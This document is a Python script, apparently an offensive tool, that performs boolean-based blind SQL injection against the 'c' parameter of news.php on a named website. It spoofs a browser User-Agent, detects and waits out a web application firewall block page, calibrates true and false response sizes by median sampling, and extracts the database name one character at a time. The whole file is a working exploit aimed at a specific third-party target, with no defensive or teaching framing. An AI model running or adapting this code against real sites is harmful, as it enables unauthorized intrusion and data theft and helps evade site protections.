#!/usr/bin/env python3
"""zagroup: numeric blind oracle - c=259 aNd (cond) with careful sizing
Response ~4645 (true-ish) vs 4423-4850 (varies) - need robust threshold
Use repeated sampling + median
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        blocked = b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body
        return r.status, len(body), blocked
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000)), False
    except Exception:
        return 0, 0, False

def get_sz(expr_suffix):
    # c=259 aNd (EXPR) -- no quote needed in numeric context
    payload = "259%20aNd%20(" + urllib.parse.quote(expr_suffix) + ")"
    code, sz, blocked = fetch(BASE + "?c=" + payload)
    time.sleep(3)
    return sz, blocked

# robust calibration: sample each 4x, use median
print("[*] calibrating numeric oracle...", flush=True)
true_vals, false_vals = [], []
for _ in range(4):
    s, b = get_sz("select 1=1")
    if not b: true_vals.append(s)
    time.sleep(2)
    s, b = get_sz("select 1=2")
    if not b: false_vals.append(s)
    time.sleep(2)
if not true_vals or not false_vals:
    print("BLOCKED - wait", flush=True)
    sys.exit(1)
true_vals.sort(); false_vals.sort()
t = true_vals[len(true_vals)//2]
f = false_vals[len(false_vals)//2]
print("true=%s med=%d | false=%s med=%d diff=%d" % (true_vals, t, false_vals, f, t - f), flush=True)
if abs(t - f) < 30:
    print("ORACLE WEAK - trying alternate expressions", flush=True)
    # try direct comparison
    for expr in ["1", "2", "length(database())>0", "length(database())>100"]:
        s, b = get_sz(expr)
        print("  expr=%s -> %d" % (expr, s), flush=True)
threshold = (t + f) / 2

def is_true(expr):
    s, b = get_sz(expr)
    if b:
        print("  (blocked %s)" % s, flush=True)
        time.sleep(30)
        s, b = get_sz(expr)
    return s > threshold

# extract db name
db = ""
for pos in range(1, 12):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
    time.sleep(2)
print("DATABASE:", db, flush=True)
